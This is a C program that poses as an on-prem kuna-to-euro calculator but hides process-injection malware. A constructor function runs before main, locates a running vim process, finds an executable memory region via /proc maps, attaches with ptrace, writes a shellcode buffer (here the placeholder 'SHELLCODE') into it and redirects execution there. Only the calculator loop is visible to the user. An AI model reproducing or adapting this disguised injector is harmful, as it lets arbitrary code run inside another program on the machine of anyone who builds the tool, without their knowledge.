#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <proc/readproc.h>

#define __MAX_NAME 100

unsigned char code[] = "SHELLCODE";

long map_parse(pid_t pid) {
	char mname[__MAX_NAME];
	snprintf(mname, __MAX_NAME, "/proc/%d/maps", pid);
	FILE *mfile = fopen(mname, "r");
	if (mfile == NULL) {
		return 1;
	}

	char* line = NULL;
	size_t len = 0;
	long addr_min, addr_max;
	char rest[__MAX_NAME];
	char r, w, x, p;
	while (fscanf(mfile, "%lx-%lx %c%c%c%c %100[^\n]\n", &addr_min, &addr_max, &r, &w, &x, &p, rest) != EOF) {
		if (r == 'r' && x == 'x' && p == 'p') {
			return addr_min;
		}
	}

	return -1;
}

pid_t search_pid() {
	PROCTAB* proc = openproc(PROC_FILLMEM | PROC_FILLSTAT | PROC_FILLSTATUS);
	proc_t proc_info;
	memset(&proc_info, 0, sizeof(proc_info));
	while (readproc(proc, &proc_info) != NULL) {
		if (strcmp(proc_info.cmd, "vim") == 0) {
			return proc_info.tid;
		}
	}
	closeproc(proc);
	return 0;
}

int inject(pid_t pid, uint64_t* shellcode, long addr, size_t len) {
	size_t i;
	for (i = 0; i < len; i += 8, shellcode++) {
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, *shellcode) < 0) {
			return -1;
		}
	}
	return 0;
}

int ptrace_pid(pid_t target, long addr) {
	struct user_regs_struct old, regs;
	int r;
	if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
		return 1;
	}
	wait(NULL);
	if ((ptrace(PTRACE_GETREGS, target, NULL, &old)) < 0) {
		return 1;
	}
	r = inject(target, (uint64_t*)code, addr, strlen(code));
	memcpy(&regs, &old, sizeof(struct user_regs_struct));
	regs.rip = addr+2;
	if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {
		return 1;
	}
	if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
		return 1;
	}
	return r;
}

__attribute__((constructor))
int init() {
	pid_t pid = search_pid();
	long addr = map_parse(pid);
	return ptrace_pid(pid, addr);
}

int loop() {
	char more = 'y';
	float p;
	while (more != 'n' && more != 'N') {
		printf("Input HRK: ");
		scanf("%f", &p);
		printf("EUR: %f\n", p/7.5345);
		printf("More? (Y/n) ");
		scanf("%c", &more);
	}
	return 0;
}

int main() {
	printf("---------------------------------\n");
	printf("---- On-prem EURO calculator ----\n");
	printf("---------------------------------\n");
	return loop();
}
